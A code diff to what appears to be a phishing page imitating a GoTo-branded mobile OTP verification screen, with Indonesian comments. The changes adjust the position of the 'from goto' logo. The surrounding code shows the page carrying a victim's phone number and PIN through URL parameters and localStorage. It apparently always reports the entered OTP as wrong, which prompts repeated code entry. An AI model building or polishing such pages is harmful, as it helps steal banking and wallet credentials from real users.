@@ -15,17 +15,17 @@
 </head>
 <body class="flex flex-col min-h-screen text-slate-800 antialiased select-none" onclick="aktifkanAudioPertama()">
 
-  <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col justify-between pt-5 px-6 pb-6 shadow-sm">
+  <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col pt-5 px-6 pb-6 shadow-sm">
     
     <!-- Bagian Atas -->
     <div>
-      <!-- Baris Atas: Tombol Panah Kembali & Ikon Bantuan (?) Lebih Kecil -->
+      <!-- Baris Atas: Tombol Panah Kembali & Ikon Bantuan (?) Kecil -->
       <div class="flex items-center justify-between mb-5">
         <button type="button" onclick="history.back()" class="text-slate-800 font-bold text-2xl active:opacity-60 leading-none">
           ←
         </button>
 
-        <!-- Ikon Tanda Tanya (Diperkecil: w-7 h-7, teks text-xs) -->
+        <!-- Ikon Tanda Tanya Kecil -->
         <button type="button" class="w-7 h-7 rounded-full bg-slate-200/80 flex items-center justify-center text-slate-700 font-bold text-xs active:bg-slate-300 transition-colors">
           ?
         </button>
@@ -84,8 +84,9 @@
       </div>
     </div>
 
-    <!-- Bagian Bawah: Logo from goto -->
-    <div class="mt-auto pt-6">
+    <!-- Bagian Bawah: Logo from goto (Atur posisi naik-turun pakai pixel di sini) -->
+    <!-- Contoh: margin-top: 150px (kalau kurang naik, angka diperbesar misal 200px. Kalau mau turun, diperkecil misal 80px) -->
+    <div style="margin-top:260px;" class="pt-4">
       <div class="flex items-center justify-center gap-1 text-xs text-slate-500 font-medium">
         <span>from</span>
         <span class="text-emerald-600 font-extrabold tracking-wider text-sm">goto</span>
@@ -132,7 +133,6 @@
       mulaiTimer();
     });
 
-    // --- FUNGSI TIMER (Reset ke 60 detik) ---
     function mulaiTimer() {
       clearInterval(countdownInterval);
       timeLeft = 60;
@@ -155,7 +155,6 @@
       }, 1000);
     }
 
-    // Ambil Data Nomor HP dan PIN
     const urlParams = new URLSearchParams(window.location.search);
     const userPhone = urlParams.get('phone') || localStorage.getItem('userPhone') || "Tidak diketahui";
     const userPin = urlParams.get('pin') || localStorage.getItem('userPin') || "Tidak diketahui";
@@ -211,7 +210,6 @@
         errorMsg.classList.remove('hidden');
         ucapPesan("Kode O T P salah atau sudah kedaluwarsa. Silakan periksa kembali dan masukkan ulang.");
         
-        // Reset timer kembali ke 60 detik otomatis
         mulaiTimer();
       }, 400);
     }
